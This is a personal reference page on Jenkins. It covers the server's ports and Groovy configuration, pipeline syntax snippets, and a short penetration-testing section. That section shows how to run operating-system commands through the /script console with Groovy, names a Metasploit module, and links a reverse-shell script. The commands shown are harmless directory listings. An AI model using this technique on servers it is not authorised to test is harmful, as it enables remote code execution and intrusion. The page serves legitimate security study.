# Jenkins

<div class="row row-cols-lg-2"><div>

[Jenkins](https://www.jenkins.io/) is an open-source automation server. It means that it's not a server hosting code, but it can be connected to a GIT server such as GitLab to process [CI/CD](index.md) workflows.

* [GitHub](https://github.com/jenkinsci/jenkins) <small>(21.9k ⭐)</small>
* [User Documentation](https://www.jenkins.io/doc/book/) <small>(⛪)</small>

The biggest strength of Jenkins is that it has a great number of [plugins](https://plugins.jenkins.io/), such as plugins to visualize CI results (tests, coverage...).
</div><div>

Jenkins is written in Java, while [Groovy](https://www.groovy-lang.org) is often used for plugins and for configuration files. It runs on [Apache Tomcat](/operating-systems/cloud/webservers/others/tomcat/index.md).

**Ports** 🐲: 8080 <small>(HTTP)</small> and 5000 <small>(Master/Slave communication)</small>.

Jenkins can be connected to a database or LDAP.
</div></div>

<hr class="sep-both">

## Jenkins Pentester Notes ☠️

[![attacking_common_applications](../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![jenkins_security](../../../cybersecurity/_badges/hacktricks/jenkins_security.svg)](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

<div class="row row-cols-lg-2"><div>

Useful reference: [pwn_jenkins](https://github.com/gquere/pwn_jenkins) <small>(1.7k ⭐)</small>.

#### Enumeration

* Try to access the login page (`/login`)

#### Foothold

* Some Jenkins instances don't have authentication
* Some Jenkins instances may allow us to create accounts
</div><div>

#### Exploitation

The `/script` endpoint can be used to run groovy code.

```groovy
def command = "ls /"
def stdout = new StringBuffer(), stderr = new StringBuffer()
def process = command.execute()
process.consumeProcessOutput(stdout, stderr)
process.waitForOrKill(1000)
def exitCode = process.exitValue()
def output = stderr + stdout

println("Exit Code: ${exitCode}")
println("Output:\n${output}")
```

➡️ See also: [revsh.groovy](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) <small>(0.1k ⭐)</small>.

<details class="details-n">
<summary>Additional Notes For /script</summary>

Metasploit: `exploit/multi/http/jenkins_script_console`.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/ls","-la"] as String[])
p.waitFor()
```

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
</details>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* master/slaves (a.k.a. workers)
* freestyle projects (web interface) vs pipeline jobs (as code)
* Jenkinsfile (groovy)
* `/var/lib/jenkins3/`
</div><div>

<details class="details-n">
<summary>Basic file</summary>

```java
pipeline {
    agent any
    stages {
        stage('xxx') {
            steps {
                git 'https://github.com/example/my-java-app.git'
                git branch: env.BRANCH_NAME, url: 'URL'
                sh 'xxx'
            }
        }
    }
}
```
</details>

<details class="details-n">
<summary>Add options</summary>

```java
    options {
        buildDiscarder(logRotator(numToKeepStr: '10', daysToKeepStr: '7'))
    }
```
</details>

<details class="details-n">
<summary>Poll SCM or webhooks to trigger a pipeline</summary>

```java
    triggers {
        cron('H H(0-7) * * 1-5')
        webhook('')
    }
```
</details>

<details class="details-n">
<summary>Artifacts are the output of the build</summary>

```java
    post {
        always {
            junit '*.xml'
        }
        success {
            archiveArtifacts '*.xml'
        }
    }
```
</details>

<details class="details-n">
<summary>Bonus</summary>

```java
stage('xxx') {
    when {
        branch 'development'
    }
}
```

```java
// https://plugins.jenkins.io/warnings-ng/
recordIssues(
    tools: [clangTidy(pattern: 'clang-tidy-report.txt')]
)
```
</details>
</div></div>